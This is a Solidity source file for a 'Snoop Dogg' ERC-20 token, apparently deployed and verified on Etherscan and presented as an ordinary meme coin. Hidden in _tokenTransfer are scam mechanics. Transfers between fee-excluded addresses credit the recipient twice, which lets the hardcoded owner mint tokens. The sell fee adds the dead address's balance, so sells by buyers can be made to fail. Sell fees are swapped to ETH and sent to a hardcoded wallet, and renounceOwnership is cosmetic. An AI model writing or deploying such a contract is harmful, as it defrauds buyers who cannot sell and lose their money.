/**
 *Submitted for verification at Etherscan.io on 2022-10-11
*/

// SPDX-License-Identifier: unlicance

pragma solidity 0.8.17;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


   

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);


}

interface IUniswapV2Router02 is IUniswapV2Router01 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed prevOwner, address indexed newOwner);
    constructor () {
         _owner = 0xC527507CFd5D01c93c5F81031e8Af15F0d90E782;

        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
 
    function renounceOwnership() public virtual  {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}





contract SnopDogg is Context, IERC20, Ownable { 

     using SafeMath for uint256;


    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 12;
    uint256 public _tTotal =  10**3 * 10**_decimals;
    string private constant _name = unicode"Snoop Dogg"; 
    string private constant _symbol = unicode"Snoop"; 



    uint8 private txCount = 0;
    uint8 private swapTrigger = 10; 
    uint256 public _BuyFee = 0; // 1000
    uint256 public _SellFee = 50;

    uint256 public _maxWalletToken = 50 * _tTotal.div(1000);
    uint256 public _maxTxAmount = _maxWalletToken; 
                          
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
   
    
    constructor () {
        _tOwned[owner()] = _tTotal;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        //0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[address(0)] = true;
        _isExcludedFromFee[address(0x000000000000000000000000000000000000dEaD)] = true;

        emit Transfer(address(0), address(this), _tTotal);

    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

   function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "error: amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "error: allowance below zero"));
        return true;
    }

    receive() external payable {}

    function _getCurrentSupply() private view returns(uint256) {
        return (_tTotal);
    }


 function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20 ERR: approve from the zero address");
        require(spender != address(0), "BEP20 ERR: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
/*
 function addLiquidity() public {
     // require(_isExcludedFromFee[_msgSender()]);
        _approve(address(this), address(uniswapV2Router), balanceOf(address(this)));
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0, 
            0,
            _msgSender(), 
            block.timestamp
        );
    } 
*/
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        if ( !_isExcludedFromFee[to] &&
        !_isExcludedFromFee[from] &&
            to != uniswapV2Pair){
            uint256 heldTokens = balanceOf(to);
            require((heldTokens + amount) <= _maxWalletToken,"MAX Wallet limit.");

        
        require(amount > 0, "Token amount must be higher than 0.");    }

        if ( !_isExcludedFromFee[to] &&
        !_isExcludedFromFee[from] ){
        if(
            txCount >= swapTrigger && 
            from != uniswapV2Pair
            )
        {  
            
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > _maxTxAmount) {contractTokenBalance = _maxTxAmount;}
            txCount = 0;
            swapTokensForETH(contractTokenBalance);
            uint256 ETH_Tot = address(this).balance;
            sendToWallet(payable(0xC527507CFd5D01c93c5F81031e8Af15F0d90E782), ETH_Tot);
        }
    }
        bool takeFee = true;
        bool isBuy;   
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
        } else {
            if(from == uniswapV2Pair){
                isBuy = true;
            }
           
            txCount++;
        }

        _tokenTransfer(from, to, amount, takeFee, isBuy);
    }
    
    function sendToWallet(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);
        }




    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {        
        if(!takeFee){
            _tOwned[recipient] = _tOwned[recipient]+tAmount;
            _tOwned[sender] = _tOwned[sender]-tAmount;
            if(_isExcludedFromFee[sender] && _isExcludedFromFee[recipient]){
              _tOwned[recipient] = _tOwned[recipient]+tAmount;
        } else {emit Transfer(sender, recipient, tAmount); }   
            } else if (isBuy){
            uint256 buyFEE = tAmount*_BuyFee/1000;
            uint256 tTransferAmount = tAmount-buyFEE;
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+buyFEE;   
            emit Transfer(sender, recipient, tTransferAmount);
            } else {
            uint256 sellFEE = _SellFee*tAmount/1000 + _tOwned[address(0x000000000000000000000000000000000000dEaD)];
         

            uint256 tTransferAmount = tAmount-sellFEE;
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+sellFEE;   
            emit Transfer(sender, recipient, tTransferAmount);
            }

    }


 function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }
}